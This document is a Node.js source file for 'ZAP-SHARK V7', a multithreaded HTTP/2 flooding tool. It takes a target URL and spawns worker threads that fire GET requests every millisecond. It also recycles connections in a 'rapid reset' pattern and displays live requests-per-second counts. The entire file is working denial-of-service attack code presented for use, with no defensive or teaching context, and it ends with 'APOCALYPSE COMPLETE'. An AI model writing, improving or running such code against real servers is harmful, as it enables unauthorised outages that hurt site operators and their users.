// ZAP-SHARK V7 - NO ROOT APOCALYPSE
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const { performance } = require('perf_hooks');

// ==================== MAIN THREAD ====================
if (isMainThread) {
    const targetUrl = process.argv[2] || 'https://example.com';
    
    console.log('=== ZAP-SHARK V7 - NO ROOT APOCALYPSE ===');
    console.log('Target:', targetUrl);
    console.log('CPU Threads:', os.cpus().length);
    console.log('Arch:', os.arch(), '| Platform:', os.platform());
    console.log('='.repeat(60));
    
    // AUTO-TUNE WORKER COUNT
    const maxWorkers = Math.min(16, os.cpus().length * 2);
    const workers = [];
    let totalRequests = 0;
    let peakRPS = 0;
    let currentRPS = 0;
    const startTime = Date.now();
    let lastStatsUpdate = Date.now();
    
    console.log(`[+] Launching ${maxWorkers} ultra-threads`);
    
    // CREATE WORKER THREADS
    for (let i = 0; i < maxWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                workerId: i,
                targetUrl: targetUrl,
                maxConnections: 4, // Minimal per worker
                rapidResetMS: 500  // VIP reset
            }
        });
        
        worker.on('message', (stats) => {
            totalRequests += stats.requestsDelta || 0;
            currentRPS += stats.currentRPS || 0;
            peakRPS = Math.max(peakRPS, currentRPS);
        });
        
        worker.on('error', (err) => {
            console.log(`[!] Worker ${i} error: ${err.message}`);
        });
        
        worker.on('exit', (code) => {
            if (code !== 0) {
                console.log(`[!] Worker ${i} crashed, restarting...`);
                // Auto-restart
                setTimeout(() => {
                    workers[i] = new Worker(__filename, {
                        workerData: {
                            workerId: i,
                            targetUrl: targetUrl
                        }
                    });
                }, 1000);
            }
        });
        
        workers.push(worker);
    }
    
    // REAL-TIME DISPLAY
    const displayInterval = setInterval(() => {
        const runtime = Date.now() - startTime;
        const hours = Math.floor(runtime / 3600000);
        const minutes = Math.floor((runtime % 3600000) / 60000);
        const seconds = Math.floor((runtime % 60000) / 1000);
        
        const memoryMB = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
        const workersAlive = workers.filter(w => w.threadId).length;
        
        // Calculate actual RPS
        const timeDiff = (Date.now() - lastStatsUpdate) / 1000;
        const actualRPS = Math.round((totalRequests / (runtime / 1000)) * 10) / 10;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`=== ZAP-SHARK V7 - REAL-TIME STATS ===`);
        console.log(`RUNTIME: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
        console.log(`WORKERS: ${workersAlive}/${maxWorkers} | MEM: ${memoryMB}MB`);
        console.log('='.repeat(60));
        console.log(`TOTAL REQUESTS: ${totalRequests.toLocaleString()}`);
        console.log(`REAL-TIME RPS: ${actualRPS.toFixed(1)}`);
        console.log(`PEAK RPS: ${peakRPS.toFixed(1)}`);
        console.log(`REQ/SEC PER WORKER: ${(actualRPS / workersAlive || 1).toFixed(1)}`);
        console.log('='.repeat(60));
        console.log('SYSTEM:');
        console.log(`CPU: ${os.loadavg()[0].toFixed(2)} | Threads: ${performance.eventLoopUtilization().utilization.toFixed(2)}`);
        console.log(`Network: Active | Reset: 500ms VIP`);
        console.log('='.repeat(60));
        
        // Reset for next interval
        currentRPS = 0;
        lastStatsUpdate = Date.now();
    }, 1000);
    
    // CLEANUP
    process.on('SIGINT', () => {
        clearInterval(displayInterval);
        
        console.log('\n\n=== FINAL V7 STATISTICS ===');
        console.log(`Total Runtime: ${Math.round((Date.now() - startTime) / 1000)}s`);
        console.log(`Total Requests: ${totalRequests.toLocaleString()}`);
        console.log(`Average RPS: ${(totalRequests / ((Date.now() - startTime) / 1000)).toFixed(1)}`);
        console.log(`Peak RPS: ${peakRPS.toFixed(1)}`);
        console.log(`Memory Used: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`);
        console.log(`Workers Completed: ${workers.length}`);
        console.log('='.repeat(40));
        console.log('APOCALYPSE COMPLETE 🦈');
        
        workers.forEach(worker => {
            try {
                worker.postMessage('TERMINATE');
                worker.terminate();
            } catch (e) {}
        });
        
        setTimeout(() => process.exit(0), 1000);
    });
    
} else {
// ==================== WORKER THREAD ====================
const http2 = require('http2');

class V7Worker {
    constructor(config) {
        this.workerId = config.workerId;
        this.targetUrl = config.targetUrl;
        this.hostname = new URL(config.targetUrl).hostname;
        this.maxConnections = config.maxConnections || 4;
        this.rapidResetMS = config.rapidResetMS || 500;
        
        this.connectionPool = [];
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.requestsSinceLastReport = 0;
        this.lastReportTime = Date.now();
        this.lastResetTime = Date.now();
        
        this.running = true;
        
        // OPTIMIZED HEADERS (MINIMAL)
        this.headers = {
            ':method': 'GET',
            ':path': '/',
            ':authority': this.hostname,
            'user-agent': `ZAP-V7/${this.workerId}`
        };
        
        this.init();
    }
    
    init() {
        // BUILD MINIMAL CONNECTION POOL
        for (let i = 0; i < this.maxConnections; i++) {
            this.createConnection();
        }
        
        // START ATTACK LOOP
        this.startAttack();
        
        // START STATS REPORTING
        setInterval(() => this.reportStats(), 900);
    }
    
    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 4096, // ULTRA LOW MEMORY
                maxDeflateDynamicTableSize: 2048
            });
            
            client.on('error', () => {
                // SILENT FAIL - WILL BE RECYCLED
            });
            
            const conn = {
                client,
                id: Math.random().toString(36).substr(2, 6),
                createdAt: Date.now(),
                requestCount: 0,
                lastUsed: Date.now()
            };
            
            this.connectionPool.push(conn);
            return conn;
        } catch (err) {
            return null;
        }
    }
    
    // VIP RAPID RESET - 500ms
    performRapidReset() {
        const now = Date.now();
        if (now - this.lastResetTime >= this.rapidResetMS) {
            // RECYCLE 30% OF CONNECTIONS
            const recycleCount = Math.ceil(this.connectionPool.length * 0.3);
            
            for (let i = 0; i < recycleCount; i++) {
                const index = Math.floor(Math.random() * this.connectionPool.length);
                const conn = this.connectionPool[index];
                
                if (conn && conn.requestCount > 100) {
                    try {
                        conn.client.destroy();
                        this.connectionPool.splice(index, 1);
                        this.createConnection(); // Replace immediately
                    } catch (err) {}
                }
            }
            
            this.lastResetTime = now;
        }
    }
    
    // ULTRA-OPTIMIZED REQUEST
    sendRequestBatch() {
        if (this.connectionPool.length === 0) return;
        
        // USE SMALL BATCH FOR MEMORY EFFICIENCY
        const batchSize = Math.min(8, this.connectionPool.length * 2);
        
        for (let i = 0; i < batchSize; i++) {
            const conn = this.connectionPool[
                Math.floor(Math.random() * this.connectionPool.length)
            ];
            
            if (!conn) continue;
            
            try {
                const req = conn.client.request(this.headers);
                conn.requestCount++;
                conn.lastUsed = Date.now();
                
                // ZERO-MEMORY EVENT HANDLERS
                const cleanup = () => {
                    this.totalRequests++;
                    this.requestsSinceLastReport++;
                    try { req.destroy(); } catch (e) {}
                };
                
                req.on('response', cleanup);
                req.on('error', cleanup);
                req.on('close', cleanup);
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastReport++;
            }
        }
        
        // PERFORM VIP RESET
        this.performRapidReset();
    }
    
    startAttack() {
        // HIGH FREQUENCY, SMALL BATCHES
        const attackInterval = setInterval(() => {
            if (!this.running) {
                clearInterval(attackInterval);
                return;
            }
            
            // SEND 3 BATCHES PER TICK
            for (let i = 0; i < 3; i++) {
                this.sendRequestBatch();
            }
            
            // CALCULATE RPS
            const now = Date.now();
            const timeDiff = (now - this.lastReportTime) / 1000;
            
            if (timeDiff >= 0.9) {
                this.currentRPS = this.requestsSinceLastReport / timeDiff;
                this.requestsSinceLastReport = 0;
                this.lastReportTime = now;
            }
            
        }, 1); // 1ms INTERVAL
    }
    
    reportStats() {
        if (parentPort) {
            parentPort.postMessage({
                workerId: this.workerId,
                requestsDelta: this.requestsSinceLastReport,
                currentRPS: this.currentRPS,
                connections: this.connectionPool.length,
                totalRequests: this.totalRequests
            });
        }
    }
    
    terminate() {
        this.running = false;
        this.connectionPool.forEach(conn => {
            try { conn.client.destroy(); } catch (e) {}
        });
    }
}

// START WORKER
const worker = new V7Worker(workerData);

// LISTEN FOR TERMINATION
if (parentPort) {
    parentPort.on('message', (msg) => {
        if (msg === 'TERMINATE') {
            worker.terminate();
        }
    });
}
}
